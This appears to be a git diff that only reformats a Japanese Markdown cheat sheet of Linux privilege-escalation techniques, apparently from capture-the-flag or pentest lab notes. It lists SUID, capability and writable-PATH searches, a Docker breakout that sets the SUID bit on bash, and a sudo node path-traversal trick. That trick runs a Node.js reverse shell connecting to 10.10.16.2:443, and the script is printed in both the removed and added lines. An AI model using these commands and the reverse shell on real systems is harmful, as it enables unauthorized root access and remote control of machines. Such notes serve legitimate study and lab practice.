@@ -1,11 +1,11 @@
 ## ## Reverse shellが完了した後
 ptyを使用したshell
-```
+```sh
 方法1
-# python -c "import pty;pty.spawn('/bin/bash')"
+python -c "import pty;pty.spawn('/bin/bash')"
 
 方法2
-# script /
+script /
 ```
 https://hidepatidar.medium.com/spawning-interactive-reverse-shell-7732686ea775
 
@@ -25,21 +25,21 @@ https://hidepatidar.medium.com/spawning-interactive-reverse-shell-7732686ea775
      4.  この脆弱性の影響を受ける、スクリプト/アプリケーションはあるか？
      
 	書き込み可能なフォルダーを検索する方法。
-	```
-	# find / -writable 2>/dev/null | cut -d "
-	```
-    ここでecho $PATHとfindの結果を比較しPATHが通っているディレクトリに書き込み権限が
-	ないことがわかったら、/tmpなどの書き込みができるフォルダーのPATHを通してあげる必要がある。
-    ```
-	# export PATH=/tmp:$PATH
-	```
+```sh
+find / -writable 2>/dev/null | cut -d "
+```
+ここでecho $PATHとfindの結果を比較しPATHが通っているディレクトリに書き込み権限がないことがわかったら、/tmpなどの書き込みができるフォルダーのPATHを通してあげる必要がある。
+```sh
+export PATH=/tmp:$PATH
+```
 
 ---
 ## ## 2. SUID
    1.SUIDまたはSGIDビットが「s」で設定されているコマンドを特定する。
-	```
-	# find / -type f -perm -04000 -ls 2>/dev/null
-	```
+   ```sh
+   find / -type f -perm -04000 -ls 2>/dev/null
+   ```
+
    2. 上記で見つかったものを以下のサイトで調べる。
 	https://gtfobins.github.io/#
    3. 上記のサイトで有効な手段が見つからなかった場合。
@@ -49,25 +49,25 @@ https://hidepatidar.medium.com/spawning-interactive-reverse-shell-7732686ea775
 
 ---
 ## ## 3.Capabilities
-1.以下のコマンドを使用して有効なケーパビリティを確認できる。
-  ```
-  # getcap
-  ```
-2.上記のコマンドのみだとめちゃくちゃエラー出力が出るので以下を実施。
-  ```
-  # getcap -r / 2>/dev/null
-  ```
+1. 以下のコマンドを使用して有効なケーパビリティを確認できる。
+```sh
+getcap
+```
+2. 上記のコマンドのみだとめちゃくちゃエラー出力が出るので以下を実施。
+```sh
+getcap -r / 2>/dev/null
+```
 
 ---
 ## ## Docker
    前提:コンテナ上でRoot権限を取得していること
    1. ホスト側で以下のコマンドを入力してDockerコンテナとホスト間で共有してあるディスクを確認する。
-      ```
-      # df -h
-      ```
-      
-      以下が返ってくる。
+```sh
+df -h
 ```
+
+以下が返ってくる。
+```sh
 Filesystem      Size  Used Avail Use% Mounted on
 udev            1.9G     0  1.9G   0% /dev
 tmpfs           394M  1.3M  392M   1% /run
@@ -83,15 +83,15 @@ tmpfs           394M     0  394M   0% /run/user/1000
 ```
 
    2. DockerContainerにて以下のコマンドを実行
-      ```sh
-      cd /bin/
-      chmod u+s ./bash
-      ```
+```sh
+cd /bin/
+chmod u+s ./bash
+```
       
    3. マシンのホスト側にて以下を実施
-      ```sh
-      bash -p
-      ```
+```sh
+bash -p
+```
   - 参考
     - Hacktricks
       https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation
@@ -100,29 +100,30 @@ tmpfs           394M     0  394M   0% /run/user/1000
 
 ## ## SUDO
    - sudo -l
-     /usr/local/scripts/に書き込み権限がないときは/usr/local/scripts/../../../で書き込みができるディレクトリまでさかのぼり実行すればできる。
-     ```
-     (ALL) /usr/bin/node /usr/local/scripts/*.js
-     ```
+    /usr/local/scripts/に書き込み権限がないときは/usr/local/scripts/../../../で書き込みができるディレクトリまでさかのぼり実行すればできる。
+```sh
+(ALL) /usr/bin/node /usr/local/scripts/*.js
+```
      
-     - 以下のようなコードで実行可能
-       ```
-       # cat /home/angoose/reverseshell.js 
-       (function(){
-        var net = require("net"),
-          cp = require("child_process"),
-          sh = cp.spawn("/bin/bash", []);
-        var client = new net.Socket();
-        client.connect(443, "10.10.16.2", function(){
-          client.pipe(sh.stdin);
-          sh.stdout.pipe(client);
-          sh.stderr.pipe(client);
-        });
-        return /a/; // Prevents the Node.js application from crashing
-        })();
-        ```
-        - payload
-          ```
-	          # sudo /usr/bin/node /usr/local/scripts/../../../..//home/angoose/reverseshell.js
-          ```
+- 以下のようなコードで実行可能
+```sh
+cat /home/angoose/reverseshell.js 
+
+(function(){
+var net = require("net"),
+cp = require("child_process"),
+sh = cp.spawn("/bin/bash", []);
+var client = new net.Socket();
+client.connect(443, "10.10.16.2", function(){
+client.pipe(sh.stdin);
+sh.stdout.pipe(client);
+sh.stderr.pipe(client);
+});
+return /a/; // Prevents the Node.js application from crashing
+})();
+```
+- payload
+```sh
+sudo /usr/bin/node /usr/local/scripts/../../../..//home/angoose/reverseshell.js
+```
         
